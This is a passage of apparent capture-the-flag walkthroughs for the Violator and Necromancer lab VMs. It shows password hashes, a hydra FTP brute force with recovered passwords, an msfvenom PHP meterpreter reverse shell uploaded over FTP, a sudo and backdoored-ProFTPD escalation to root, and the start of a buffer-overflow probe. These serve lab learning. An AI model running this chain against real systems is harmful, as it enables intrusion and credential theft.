</span><span class='line'>root:$1$TOi0HE5n$j3obHaAlUdMbHQnJ4Y5Dq0:0:0:DO NOT CHANGE PASSWORD - WILL BREAK FTP ENCRYPTION:/root:/bin/bash
</span><span class='line'>aadams:$1$6cP/ya8m$2CNF8mE.ONyQipxlwjp8P1:1000:10:,,,:/home/aadams:/bin/bash
</span><span class='line'>bbanter:$1$hl312g8m$Cf9v9OoRN062STzYiWDTh1:1001:100:,,,:/home/bbanter:/bin/bash
</span><span class='line'>ccoffee:$1$nsHnABm3$OHraCR9ro.idCMtEiFPPA.:1002:100:,,,:/home/ccoffee:/bin/bash</span></code></pre></td></tr></table></div></figure>
</li></p>

<p><li>
<br>
<strong>Violator:</strong>
Nmap scans provides
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p- -A 192.168.56.102 -oA Violator -vv
</span><span class='line'>
</span><span class='line'>PORT   STATE SERVICE REASON         VERSION
</span><span class='line'>21/tcp open  ftp     syn-ack ttl 64 ProFTPD 1.3.5rc3
</span><span class='line'>80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.7 ((Ubuntu))
</span><span class='line'>| http-methods:
</span><span class='line'>|<em>  Supported Methods: GET HEAD POST OPTIONS
</span><span class='line'>|</em>http-server-header: Apache/2.4.7 (Ubuntu)
</span><span class='line'>|_http-title: I Say&hellip; I say&hellip; I say Boy! You pumpin' for oil or somethin'&hellip;?
</span></code></pre></td></tr></table></div></figure></p>

<p>Searching proftpd 1.3.5 in searchsploit provides you a exploit
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ProFTPd 1.3.5 - File Copy                                                                                                                                                                     | ./linux/remote/36742.txt
</span><span class='line'>ProFTPd 1.3.5 (mod_copy) - Remote Command Execution                                                                                                                                           | ./linux/remote/36803.py
</span><span class='line'>ProFTPD 1.3.5 - Mod_Copy Command Execution                                                                                                                                                    | ./linux/remote/37262.rb</span></code></pre></td></tr></table></div></figure>
Metasploit has a module which provides a shell
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>
</span><span class='line'>`&ldquo;
</span><span class='line'>On the webserver, we found a link to the wiki of Violator <a href="https://en.wikipedia.org/wiki/Violator_%28album%29.">https://en.wikipedia.org/wiki/Violator_%28album%29.</a> If we use cewl to generate a wordlist on the wiki, it will generate only one word list for example if &ldquo;Policy of Truth&rdquo; is written in quotes. It will treat it as three words. However, what we wanted is to consider whole word between the quotes. By doing a small change in the cewl source code and removing spaces and changing upper to lower, we were able to create a small wordlist of 400 words.</span></code></pre></td></tr></table></div></figure>
awk &lsquo;length($0)&lt;20&rsquo; quotes | awk &lsquo;length($0)>4&rsquo; | sed &rsquo;s/ //gi'| tr &lsquo;[:upper:]&rsquo; &lsquo;[:lower:]&rsquo; > wordlist.txt
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre>&lt;code class=&rdquo;><span class='line'>Using hydra to brute force the accounts</span></code></pre></td></tr></table></div></figure>
hydra -L usernames.txt -P wordlist.txt <a href="ftp://192.168.1.2">ftp://192.168.1.2</a>
Hydra v8.2 &copy; 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.</p>

<p>Hydra (<a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra</a>) starting at 2016-07-29 01:31:29
[DATA] max 16 tasks per 1 server, overall 64 tasks, 570 login tries (l:5/p:114), ~0 tries per task
[DATA] attacking service ftp on port 21
[21][ftp] host: 192.168.1.2   login: dg   password: policyoftruth
[21][ftp] host: 192.168.1.2   login: af   password: enjoythesilence
[21][ftp] host: 192.168.1.2   login: mg   password: bluedress
[21][ftp] host: 192.168.1.2   login: aw   password: sweetestperfection
1 of 1 target successfully completed, 5 valid passwords found
Hydra (<a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra</a>) finished at 2016-07-29 01:31:43
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>We can upload a php meterpreter reverse shell by using ftp </span></code></pre></td></tr></table></div></figure>
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 R > payload.php
No platform was selected, choosing Msf::Module::Platform::PHP from the payload
No Arch selected, selecting Arch: php from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 947 bytes
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>`&ldquo;
</span><span class='line'>ftp 192.168.1.2
</span><span class='line'>Connected to 192.168.1.2.
</span><span class='line'>220 ProFTPD 1.3.5rc3 Server (Debian) [::ffff:192.168.1.2]
</span><span class='line'>Name (192.168.1.2:xx): dg
</span><span class='line'>331 Password required for dg
</span><span class='line'>Password:
</span><span class='line'>230 User dg logged in
</span><span class='line'>Remote system type is UNIX.
</span><span class='line'>Using binary mode to transfer files.
</span><span class='line'>ftp&gt; cd /var/www/html
</span><span class='line'>250 CWD command successful
</span><span class='line'>ftp&gt; put payload.php
</span><span class='line'>local: payload.php remote: payload.php
</span><span class='line'>200 PORT command successful
</span><span class='line'>150 Opening BINARY mode data connection for payload.php
</span><span class='line'>226 Transfer complete
</span><span class='line'>947 bytes sent in 0.00 secs (37.6304 MB/s)</span></code></pre></td></tr></table></div></figure>
Setting up a exploit handler at LPORT 4444 and visiting the payload provides us the meterpreter shell. By logging to dg, we can see the sudo permissions of dg
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre>&lt;code class=&rdquo;><span class='line'>dg@violator:/var/www/html$ sudo -l
</span><span class='line'>sudo -l
</span><span class='line'>Matching Defaults entries for dg on violator:
</span><span class='line'>    env_reset, mail_badpass,
</span><span class='line'>    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
</span><span class='line'>
</span><span class='line'>User dg may run the following commands on violator:
</span><span class='line'>    (ALL) NOPASSWD: /home/dg/bd/sbin/proftpd
</span></code></pre></td></tr></table></div></figure>
We should be able to run proftpd present at /home/dg/bd/sbin/proftpd with root permissions. On checking the proftpd.conf, we found out that the proftpd runs on port 2121 and only on localhost.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat proftpd.conf
</span><span class='line'>cat proftpd.conf
</span><span class='line'># This is a basic ProFTPD configuration file (rename it to
</span><span class='line'># &lsquo;proftpd.conf&rsquo; for actual use.  It establishes a single server
</span><span class='line'># and a single anonymous login.  It assumes that you have a user/group
</span><span class='line'># &ldquo;nobody&rdquo; and &ldquo;ftp&rdquo; for normal operation and anon.
</span><span class='line'>
</span><span class='line'>ServerName            &ldquo;Depeche Mode Violator Server&rdquo;
</span><span class='line'>ServerType            standalone
</span><span class='line'>DefaultServer         on
</span><span class='line'>
</span><span class='line'># Belt up son!
</span><span class='line'>SocketBindTight           on
</span><span class='line'>
</span><span class='line'># Port 21 is the standard FTP port.
</span><span class='line'>Port              2121
</span><span class='line'>
</span><span class='line'># Listen onnly on lo
</span><span class='line'>DefaultAddress            127.0.0.1</span></code></pre></td></tr></table></div></figure>
On connecting
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ftp localhost 2121
</span><span class='line'>Connected to localhost.
</span><span class='line'>220 ProFTPD 1.3.3c Server (Depeche Mode Violator Server) [127.0.0.1]</span></code></pre></td></tr></table></div></figure>
The FTP Server is ProFTPD 1.3.3c which is backdoored ( found by using searchsploit ).</p>

<p>As we have the meterpreter shell, we can portfwd our connection to Violater port 2121
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> portfwd add 192.168.1.1 -l 2121 -r 127.0.0.1 -p 2121
</span><span class='line'>[*] Local TCP relay created: :2121 &lt;-&gt; 127.0.0.1:2121</span></code></pre></td></tr></table></div></figure>
and execute the msf proftpd_133c_backdoor module to get a root shell :)</p>

<p>Once you get the root shell, in the /root folder, there&rsquo;s a password protected rar file, crackable by using the wordlist generated by cewl with quotes included.
New thing to learn by rar2john which generates a hash of rar password. :)
</li></p>

<p><li>
<strong>Necromancer</strong>:
On TCP Port scanning the Necromancer:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># Nmap 7.12 scan initiated Fri Jul 15 14:44:47 2016 as: nmap -p- -n -oA Necro -vv 192.168.56.101
</span><span class='line'>Nmap scan report for 192.168.56.101
</span><span class='line'>Host is up, received arp-response (0.00020s latency).
</span><span class='line'>All 65535 scanned ports on 192.168.56.101 are filtered because of 65535 no-responses
</span><span class='line'>MAC Address: 08:00:27:DE:4E:19 (Oracle VirtualBox virtual NIC)
</span><span class='line'>
</span><span class='line'>Read data files from: /usr/bin/../share/nmap
</span><span class='line'># Nmap done at Fri Jul 15 15:06:41 2016 &ndash; 1 IP address (1 host up) scanned in 1314.06 seconds</span></code></pre></td></tr></table></div></figure>
On UDP Port Scanning:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># Nmap 7.12 scan initiated Fri Jul 15 15:07:11 2016 as: nmap -p- -n -oA Necro_UDP -vv -sU 192.168.56.101
</span><span class='line'>Nmap scan report for 192.168.56.101
</span><span class='line'>Host is up, received arp-response (0.00048s latency).
</span><span class='line'>Scanned at 2016-07-15 15:07:11 IST for 1136s
</span><span class='line'>Not shown: 65534 open|filtered ports
</span><span class='line'>Reason: 65534 no-responses
</span><span class='line'>PORT    STATE SERVICE REASON
</span><span class='line'>666/udp open  doom    udp-response ttl 64
</span><span class='line'>MAC Address: 08:00:27:DE:4E:19 (Oracle VirtualBox virtual NIC)
</span><span class='line'>
</span><span class='line'>Read data files from: /usr/bin/../share/nmap
</span><span class='line'># Nmap done at Fri Jul 15 15:26:07 2016 &ndash; 1 IP address (1 host up) scanned in 1136.35 seconds
</span></code></pre></td></tr></table></div></figure>
On listenting on the interface vboxnet0,</p>

<p>we find the VM broadcast some data on port 4444
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>18:27:04.271798 IP 192.168.56.101.42138 &gt; 192.168.56.1.4444: Flags [S], seq 1419283988, win 16384, options [mss 1460,nop,nop,sackOK,nop,wscale 3,nop,nop,TS val 2605474657 ecr 0], length 0
</span><span class='line'>18:27:04.271828 IP 192.168.56.1.4444 &gt; 192.168.56.101.42138: Flags [R.], seq 0, ack 1419283989, win 0, length 0
</span><span class='line'>18:27:04.275580 ARP, Request who-has 192.168.56.2 tell 192.168.56.101, length 28
</span><span class='line'>18:27:04.275588 ARP, Request who-has 192.168.56.2 tell 192.168.56.101, length 28
</span><span class='line'>18:27:04.281290 ARP, Request who-has 192.168.56.4 tell 192.168.56.101, length 28
</span><span class='line'>18:27:04.281298 ARP, Request who-has 192.168.56.4 tell 192.168.56.101, length 28
</span><span class='line'>18:27:04.285544 ARP, Request who-has 192.168.56.5 tell 192.168.56.101, length 28
</span><span class='line'>18:27:04.285555 ARP, Request who-has 192.168.56.5 tell 192.168.56.101, length 28
</span><span class='line'>18:27:04.290284 ARP, Request who-has 192.168.56.6 tell 192.168.56.101, length 28</span></code></pre></td></tr></table></div></figure>
On listening on the port 4444 on 192.168.56.1
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -lvp 4444
</span><span class='line'>listening on [any] 4444 &hellip;
</span><span class='line'>192.168.56.101: inverse host lookup failed: Unknown host
</span><span class='line'>connect to [192.168.56.1] from (UNKNOWN) [192.168.56.101] 21448
</span><span class='line'>&hellip;V2VsY29tZSENCg0KWW91IGZpbmQgeW91cnNlbGYgc3RhcmluZyB0b3dhcmRzIHRoZSBob3Jpem9uLCB3aXRoIG5vdGhpbmcgYnV0IHNpbGVuY2Ugc3Vycm91bmRpbmcgeW91Lg0KWW91IGxvb2sgZWFzdCwgdGhlbiBzb3V0aCwgdGhlbiB3ZXN0LCBhbGwgeW91IGNhbiBzZWUgaXMgYSBncmVhdCB3YXN0ZWxhbmQgb2Ygbm90aGluZ25lc3MuDQoNClR1cm5pbmcgdG8geW91ciBub3J0aCB5b3Ugbm90aWNlIGEgc21hbGwgZmxpY2tlciBvZiBsaWdodCBpbiB0aGUgZGlzdGFuY2UuDQpZb3Ugd2FsayBub3J0aCB0b3dhcmRzIHRoZSBmbGlja2VyIG9mIGxpZ2h0LCBvbmx5IHRvIGJlIHN0b3BwZWQgYnkgc29tZSB0eXBlIG9mIGludmlzaWJsZSBiYXJyaWVyLiAgDQoNClRoZSBhaXIgYXJvdW5kIHlvdSBiZWdpbnMgdG8gZ2V0IHRoaWNrZXIsIGFuZCB5b3VyIGhlYXJ0IGJlZ2lucyB0byBiZWF0IGFnYWluc3QgeW91ciBjaGVzdC4gDQpZb3UgdHVybiB0byB5b3VyIGxlZnQuLiB0aGVuIHRvIHlvdXIgcmlnaHQhICBZb3UgYXJlIHRyYXBwZWQhDQoNCllvdSBmdW1ibGUgdGhyb3VnaCB5b3VyIHBvY2tldHMuLiBub3RoaW5nISAgDQpZb3UgbG9vayBkb3duIGFuZCBzZWUgeW91IGFyZSBzdGFuZGluZyBpbiBzYW5kLiAgDQpEcm9wcGluZyB0byB5b3VyIGtuZWVzIHlvdSBiZWdpbiB0byBkaWcgZnJhbnRpY2FsbHkuDQoNCkFzIHlvdSBkaWcgeW91IG5vdGljZSB0aGUgYmFycmllciBleHRlbmRzIHVuZGVyZ3JvdW5kISAgDQpGcmFudGljYWxseSB5b3Uga2VlcCBkaWdnaW5nIGFuZCBkaWdnaW5nIHVudGlsIHlvdXIgbmFpbHMgc3VkZGVubHkgY2F0Y2ggb24gYW4gb2JqZWN0Lg0KDQpZb3UgZGlnIGZ1cnRoZXIgYW5kIGRpc2NvdmVyIGEgc21hbGwgd29vZGVuIGJveC4gIA0KZmxhZzF7ZTYwNzhiOWIxYWFjOTE1ZDExYjlmZDU5NzkxMDMwYmZ9IGlzIGVuZ3JhdmVkIG9uIHRoZSBsaWQuDQoNCllvdSBvcGVuIHRoZSBib3gsIGFuZCBmaW5kIGEgcGFyY2htZW50IHdpdGggdGhlIGZvbGxvd2luZyB3cml0dGVuIG9uIGl0LiAiQ2hhbnQgdGhlIHN0cmluZyBvZiBmbGFnMSAtIHU2NjYi&hellip;
</span></code></pre></td></tr></table></div></figure>
On decoding the base64 string
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Welcome!
</span><span class='line'>
</span><span class='line'>You find yourself staring towards the horizon, with nothing but silence surrounding you.
</span><span class='line'>You look east, then south, then west, all you can see is a great wasteland of nothingness.
</span><span class='line'>
</span><span class='line'>Turning to your north you notice a small flicker of light in the distance.
</span><span class='line'>You walk north towards the flicker of light, only to be stopped by some type of invisible barrier.<br/>
</span><span class='line'>
</span><span class='line'>The air around you begins to get thicker, and your heart begins to beat against your chest.
</span><span class='line'>You turn to your left.. then to your right!  You are trapped!
</span><span class='line'>
</span><span class='line'>You fumble through your pockets.. nothing!<br/>
</span><span class='line'>You look down and see you are standing in sand.<br/>
</span><span class='line'>Dropping to your knees you begin to dig frantically.
</span><span class='line'>
</span><span class='line'>As you dig you notice the barrier extends underground!<br/>
</span><span class='line'>Frantically you keep digging and digging until your nails suddenly catch on an object.
</span><span class='line'>
</span><span class='line'>You dig further and discover a small wooden box.<br/>
</span><span class='line'>flag1{e6078b9b1aac915d11b9fd59791030bf} is engraved on the lid.
</span><span class='line'>
</span><span class='line'>You open the box, and find a parchment with the following written on it. &ldquo;Chant the string of flag1 - u666&rdquo;</span></code></pre></td></tr></table></div></figure></p>

<p>Chant the string of flag1 is a important sentence, I was quite stupid, to just try HEX on the string. Whenever, we receive such string, it&rsquo;s better to identify it using hash-identifier, which identifies it as a MD5. Searching on google for this string, it results in opensesame. Chanting the string of opensesame on the UDP port 666
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -u 192.168.56.101 666
</span><span class='line'>e6078b9b1aac915d11b9fd59791030bf
</span><span class='line'>Chant had no affect! Try in a different tongue!
</span><span class='line'>opensesame
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>A loud crack of thunder sounds as you are knocked to your feet!
</span><span class='line'>
</span><span class='line'>Dazed, you start to feel fresh air entering your lungs.
</span><span class='line'>
</span><span class='line'>You are free!
</span><span class='line'>
</span><span class='line'>In front of you written in the sand are the words:
</span><span class='line'>
</span><span class='line'>flag2{c39cd4df8f2e35d20d92c2e44de5f7c6}
</span><span class='line'>
</span><span class='line'>As you stand to your feet you notice that you can no longer see the flicker of light in the distance.
</span><span class='line'>
</span><span class='line'>You turn frantically looking in all directions until suddenly, a murder of crows appear on the horizon.
</span><span class='line'>
</span><span class='line'>As they get closer you can see one of the crows is grasping on to an object. As the sun hits the object, shards of light beam from its surface.
</span><span class='line'>
</span><span class='line'>The birds get closer, and closer, and closer.
</span><span class='line'>
</span><span class='line'>Staring up at the crows you can see they are in a formation.
</span><span class='line'>
</span><span class='line'>Squinting your eyes from the light coming from the object, you can see the formation looks like the numeral 80.
</span><span class='line'>
</span><span class='line'>As quickly as the birds appeared, they have left you once again&hellip;. alone&hellip; tortured by the deafening sound of silence.
</span><span class='line'>
</span><span class='line'>666 is closed.</span></code></pre></td></tr></table></div></figure>
On rescanning the Necromancer VM, we found that a TCP port got open and UDP Port 666 closed
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p- 192.168.56.101 -oA Necro3 -v
</span><span class='line'>
</span><span class='line'>Nmap scan report for 192.168.56.101
</span><span class='line'>Host is up (0.00038s latency).
</span><span class='line'>Not shown: 65534 filtered ports
</span><span class='line'>PORT   STATE SERVICE
</span><span class='line'>80/tcp open  http
</span><span class='line'>MAC Address: 08:00:27:DE:4E:19 (Oracle VirtualBox virtual NIC)</span></code></pre></td></tr></table></div></figure>
On browsing port 80, a webpage opens with the text and a photograph
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Hours have passed since you first started to follow the crows.
</span><span class='line'>
</span><span class='line'>Silence continues to engulf you as you treck towards a mountain range on the horizon.
</span><span class='line'>
</span><span class='line'>More times passes and you are now standing in front of a great chasm.
</span><span class='line'>
</span><span class='line'>Across the chasm you can see a necromancer standing in the mouth of a cave, staring skyward at the circling crows.
</span><span class='line'>
</span><span class='line'>As you step closer to the chasm, a rock dislodges from beneath your feet and falls into the dark depths.
</span><span class='line'>
</span><span class='line'>The necromancer looks towards you with hollow eyes which can only be described as death.
</span><span class='line'>
</span><span class='line'>He smirks in your direction, and suddenly a bright light momentarily blinds you.
</span><span class='line'>
</span><span class='line'>The silence is broken by a blood curdling screech of a thousand birds, followed by the necromancers laughs fading as he decends into the cave!
</span><span class='line'>
</span><span class='line'>The crows break their formation, some flying aimlessly in the air; others now motionless upon the ground.
</span><span class='line'>
</span><span class='line'>The cave is now protected by a gaseous blue haze, and an organised pile of feathers lay before you.
</span></code></pre></td></tr></table></div></figure>
If we read the text, which we got on port 666, it says &ldquo;you can see on of the crows is grasping on to an object&rdquo; which I believe serves as an hint. on running file and string or binwalk on the image, we find a txt file is hidden in the image.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>binwalk pileoffeathers.jpg
</span><span class='line'>
</span><span class='line'>DECIMAL       HEXADECIMAL     DESCRIPTION
</span><span class='line'>&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;
</span><span class='line'>0             0x0             JPEG image data, EXIF standard
</span><span class='line'>12            0xC             TIFF image data, little-endian offset of first image directory: 8
</span><span class='line'>270           0x10E           Unix path: /www.w3.org/1999/02/22-rdf-syntax-ns#&ldquo;&gt;
</span><span class='line'>36994         0x9082          Zip archive data, at least v2.0 to extract, compressed size: 121, uncompressed size: 125, name: feathers.txt
</span><span class='line'>37267         0x9193          End of Zip archive</span></code></pre></td></tr></table></div></figure>
Extracting the feathers.txt with 7z. It contains a base64 encoded string which provides the path
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat feathers.txt | base64 -d
</span><span class='line'>flag3{9ad3f62db7b91c28b68137000394639f} - Cross the chasm at /amagicbridgeappearsatthechasm</span></code></pre></td></tr></table></div></figure>
Following the trail at <a href="http://192.168.56.101/amagicbridgeappearsatthechasm/">http://192.168.56.101/amagicbridgeappearsatthechasm/</a> we get another text
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>You cautiously make your way across chasm.
</span><span class='line'>
</span><span class='line'>You are standing on a snow covered plateau, surrounded by shear cliffs of ice and stone.
</span><span class='line'>
</span><span class='line'>The cave before you is protected by some sort of spell cast by the necromancer.
</span><span class='line'>
</span><span class='line'>You reach out to touch the gaseous blue haze, and can feel life being drawn from your soul the closer you get.
</span><span class='line'>
</span><span class='line'>Hastily you take a few steps back away from the cave entrance.
</span><span class='line'>
</span><span class='line'>There must be a magical item that could protect you from the necromancer&rsquo;s spell.</span></code></pre></td></tr></table></div></figure>
Again, if you see the hint is provided "Magical item that could protect you from the necromancer&rsquo;s spell&rdquo;. We found this using rockyou or darkc0de wordlist</p>

<p>Running dirb with rockyou/ darc0de provides the 200 HTTP Code</p>

<p>Running file on it
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>file talisman
</span><span class='line'>talisman: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=2b131df906087adf163f8cba1967b3d2766e639d, not stripped</span></code></pre></td></tr></table></div></figure>
Executing it, it asks for a input
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/talisman
</span><span class='line'>You have found a talisman.
</span><span class='line'>
</span><span class='line'>The talisman is cold to the touch, and has no words or symbols on it&rsquo;s surface.
</span><span class='line'>
</span><span class='line'>Do you want to wear the talisman?  asfsaf
</span><span class='line'>
</span><span class='line'>Nothing happens.</span></code></pre></td></tr></table></div></figure>
Using python print command to send a large number of characters to see if it crashes
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>python -c &lsquo;print &ldquo;A&rdquo; * 40&rsquo; | ./talisman
</span><span class='line'>You have found a talisman.
</span><span class='line'>
</span><span class='line'>The talisman is cold to the touch, and has no words or symbols on it&rsquo;s surface.
</span><span class='line'>
</span><span class='line'>Do you want to wear the talisman?<br/>
